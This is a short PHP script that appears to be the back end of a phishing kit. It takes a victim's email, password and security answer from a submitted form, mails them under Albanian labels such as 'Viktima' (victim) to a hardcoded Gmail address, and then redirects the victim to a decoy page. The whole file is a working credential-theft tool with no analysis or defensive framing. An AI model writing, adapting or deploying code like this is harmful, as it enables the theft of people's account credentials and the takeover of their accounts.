<?

session_start();

$email = $_POST['email'];
$pass = $_POST['pass'];
$answer = $_POST['answer'];
$message .= "IP                      : ".$ip."\n";
$message .= "---------+u krijua nga: [S-P-M]&Mikrotik+-------------\n";

//sending email info here

$subj = " qe merri ";
$msg = "Viktima: $email\nItaqi: $pass\nFaqja: $answer\n";
mail("muham3dd@gmail.com", $subj, $msg);
$subject = "Dhuratat";
$headers = "From: UrimeVitiRi<muham3dd@gmail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
header("Location: bussines.htm");
?>